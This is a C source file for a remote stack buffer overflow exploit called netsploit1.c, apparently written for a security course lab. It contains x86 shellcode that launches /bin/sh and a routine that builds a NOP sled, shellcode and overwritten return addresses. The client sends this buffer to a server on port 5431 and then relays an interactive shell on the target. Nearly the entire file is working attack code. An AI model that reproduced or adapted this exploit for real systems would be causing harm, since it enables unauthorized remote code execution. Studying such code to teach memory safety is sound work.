/* Program name:	netsploit1.c
 * To compile:	gcc netsploit1.c -o netsploit1 # -lsocket -lnsl
 * To use:	netsploit1 hostname address
 * connects to corresponding server and  sends one line at a time.
 *
 * This version supports the commands
 *	doit	-- send the buffer
 *  shell	-- start the shell mode
 *  noshell -- stop the shell mode: not implemented, not needed
 * 
 * If I turn off address-space-randomization on the server
 * (/proc/sys/kernel/randomize_va_space == 0)
 * then I don't need this guess-the-addr hack.
 * On ubuntu, the global buffer is at 0xbffff980
 *
 * Shellcode updated 2019
 */

// this creates a shell on the stdin and stdout of the other side

char shellcode2014[] = 					// 50 bytes total
	"\xeb\x1a\x5b\x29\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c"
	"\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\x29\xc9\x29\xd2\xcd\x80"
	"\xe8\xe1\xff\xff\xff/bin/sh/NAAAABBBB";

char shellcode2019[] =
	"\xeb\x16\x5b\x29\xc0\x88\x43\x07\x89\x5b\x08\x89"
	"\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80"
	"\xe8\xe5\xff\xff\xff/bin/sh/NAAAABBBB";

char * shellcode = shellcode2019;

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>

#define SERVER_PORT 5431
//#define BUFSIZE 80

// BADBUFSIZE should be of the form 4n+1 so as to have one space at the end for a newline
// It should also be comparable to BUF_OFFSET
#define BADBUFSIZE 161
#define MAX_LINE   80

#define TRUE 1

// BUF_OFFSET is from the start of pcbuf[] to the start of mbuf[] **on the server**
#define BUF_OFFSET  147
#define FUDGE	    10

#define DOIT "doit"
#define SHELL "shell"
#define QUIT "quit\n"
// if ASLR is turned off, put the server's now-fixed stack starting address here:
#define UBUNTU_BASE 0xbffff000

void badbufbuild(char* buf, int nop_count, int bufsize, unsigned int p) ;
int cutword(char * p, int size);
void copylines(int fd) ;

int main(int argc, char ** argv) {
	int sock;
	struct sockaddr_in sin;
	struct hostent *hp;
	FILE* fp;
	char *host = "localhost";
	char buf[MAX_LINE+1];
	char badbuf[BADBUFSIZE+1];
	int len;
	// void* baseaddr = (void*) UBUNTU_BASE;
	unsigned int baseaddr = UBUNTU_BASE;

	if (argc >=2) {
	    sscanf(argv[1], "%x",  &baseaddr);
	}
	fprintf(stderr, "base addr = %x\n",  baseaddr);

	if (argc >=3) {
	    host = argv[2];
	}

	printf("length of shellcode: %ld\n", strlen(shellcode));

	/* Create socket on which to send. */
	sock = socket(PF_INET,SOCK_STREAM,0);
	if (sock < 0) {
		perror("opening datagram socket");
		exit(1);
	}
	
	// Construct name, with no wildcards, of the socket to send to.
	// Gethostbyname() returns a structure including the network address
	// of the specified host. The port number is taken from the command line.
	
	hp = gethostbyname(host);
	if (hp == 0) {
		fprintf(stderr, "%s: unknown host", host);
		exit(2);
	}
 	memcpy((void*) &sin.sin_addr, hp->h_addr, hp->h_length);   // copy IP addr
	fprintf(stderr, "destination address is %s\n", inet_ntoa(sin.sin_addr));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(SERVER_PORT);

	//Build the bad buffer
	badbufbuild(badbuf, 25, BADBUFSIZE, baseaddr-BUF_OFFSET+FUDGE);

	fprintf(stderr, "preparing to connect"); // with buf = %s\n", badbuf);

	if (connect(sock, (struct sockaddr *) &sin, sizeof sin) < 0) {
		perror("connect failed");
		exit(1);
	}

        // now start the simplex-talk loop

        while (TRUE) {
		fprintf(stdout, "\n> ");
		fgets(buf, sizeof(buf), stdin);
		len = cutword(buf, sizeof(buf));

		if (strncmp(buf, DOIT, len) == 0) {
			send(sock, badbuf, BADBUFSIZE, 0);
			fprintf(stderr, "sent bad buffer\n");
			send(sock, QUIT, strlen(QUIT), 0);
			copylines(sock);
		} else {
			len = strlen(buf);
			send(sock, buf, len, 0);	
		}
        }
        return 0;
}

// reads from first file descriptor, writes to second, & vice-versa, indefinitely
// prolly should work on that "indefinitely", but that's what ^C is for
// usually, "first" is the server

#define COPYMAX 1000

void copylines(int fd) {
	char buf[COPYMAX+1];
	int len;
	int line = 0;
	int n;
	fprintf(stdout, "copylines\n");
	while (TRUE) {

		fprintf(stdout, "\n%d> ", ++line);	// one line from stdin to fd
		fgets(buf, sizeof(buf), stdin);
		buf[MAX_LINE] = '\0';
		len = strlen(buf);

		send(fd, buf, len, 0);

		len = recv(fd, buf, sizeof(buf), 0);	// one line from fd to stdout
		fwrite(buf, 1, len, stdout);
	}
}



// build the bad buffer
// NOP NOP NOP ... NOP <<shellcode>> ptr ptr ptr ptr ptr
// note that ptr is 4 bytes, NOP is 1 byte
//
#define NOP 0x90

void badbufbuild(char* buf, int nop_count, int bufsize, unsigned int p) {
	int i;
	int * ibuf = (int*) buf;
	// fill with p's
	for (i=0; i<bufsize/4; i++) ibuf[i]=p;
	// fill with nops:
	for (i=0; i<nop_count; i++) buf[i]=NOP;
	// copy shellcode, withOUT final null
	for (i=0; i < strlen(shellcode); i++) buf[i+nop_count]=shellcode[i];
	// poke in a terminating newline for the sake of a receiving gets()
	buf[bufsize-1] = '\n';
	return;
	for (i=0; i < bufsize; i++) {
		if (buf[i] == '\0') fprintf(stderr, "null byte at position %d\n", i);
	}
	for (i=0; i < bufsize; i++) {
		if (buf[i] == '\n') fprintf(stderr, "newline at position %d\n", i);
	}
	if (1) {
		ibuf = (int*) buf;
		for (i=0; i<bufsize/4; i++) {
		    fprintf(stderr, "badbuf[%d] = %x\n", i, (unsigned) ibuf[i]);
		}
	}
}


// takes a string in a buffer pointed to by p, of at least size bytes,
// and returns the index of the first char that is null,blank,tab,or newline.
// That is, it returns the length of the first "word"
// If 1st char is blank/etc, the word is zero-length

int cutword(char * p, int size) {
	p[size-1]='\0';
    char * q = p;
	while (*q != ' ' && *q != '\t' && *q != '\n' && *q != '\0') q++;
	return (q-p);
}
